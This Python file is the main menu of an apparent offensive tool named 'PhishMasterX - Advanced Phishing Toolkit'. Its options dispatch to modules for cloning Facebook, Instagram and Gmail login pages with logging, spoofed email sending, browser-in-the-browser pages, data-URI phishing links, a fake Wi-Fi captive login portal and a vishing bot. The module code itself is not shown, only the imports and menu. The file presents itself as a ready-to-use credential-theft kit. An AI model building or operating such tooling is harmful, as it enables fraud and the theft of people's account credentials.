
def main_menu():
    print("\n📡 PhishMasterX - Advanced Phishing Toolkit\n")
    print("1. Website Cloner + Logger")
    print("2. QR Code Generator")
    print("3. Email Phishing Sender")
    print("4. Analyze HTML for Phishing")
    print("5. Launch BitB Phishing Page")
    print("6. Create Data URI Phishing Link")
    print("7. Start Wi-Fi Captive Portal (Fake Login Page)")
    print("8. Voice Phishing Bot (Vishing)")
    print("9. Exit")

    choice = input("Select Option (1/2/3/4/5/6/7/8/9): ")

    if choice == "1":
        # Submenu for Website Cloner
        print("\n[🔎] Select a site to clone:")
        print("1. Facebook")
        print("2. Instagram")
        print("3. Gmail")
        sub_choice = input("Select option (1/2/3): ").strip()

        site_map = {
            "1": "facebook",
            "2": "instagram",
            "3": "gmail"
        }

        if sub_choice in site_map:
            from core.cloner import start_cloner
            start_cloner(site_map[sub_choice])
        else:
            print("❌ Invalid option.")

    elif choice == "2":
        from core.qr_module import generate_qr
        generate_qr()

    elif choice == "3":
        from email_mod.smtp_spoofer import send_email
        send_email()

    elif choice == "4":
        from core.ai_detector import analyze_html
        analyze_html()

    elif choice == "5":
        from core.bitb_phisher import start_bitb_dynamic
        print("\n[🔎] BitB Options:")
        print("1. Facebook")
        print("2. Instagram")
        print("3. Gmail")
        print("4. Custom URL")
        sub_choice = input("Select option (1/2/3/4): ").strip()

        if sub_choice in ["1", "2", "3"]:
            bitb_map = {
                "1": "bitb_facebook.html",
                "2": "bitb_instagram.html",
                "3": "bitb_gmail.html"
            }
            from core.bitb_phisher import start_bitb_dynamic
            start_bitb_dynamic(bitb_map[sub_choice], None)

        elif sub_choice == "4":
            custom_url = input("Enter custom URL (e.g. https://example.com): ").strip()
            from core.bitb_phisher import start_bitb_dynamic
            start_bitb_dynamic("bitb_custom.html", custom_url)
        else:
            print("❌ Invalid option.")


    elif choice == "6":
        from core.data_uri_builder import create_data_uri
        create_data_uri()

    elif choice == "7":
        from core.wifi_phisher import start_captive
        start_captive()

    elif choice == "8":
        from voicebot.voice_bot import vishing_bot
        vishing_bot()

    elif choice == "9":
        print("Goodbye!")

    else:
        print("❌ Invalid Option")

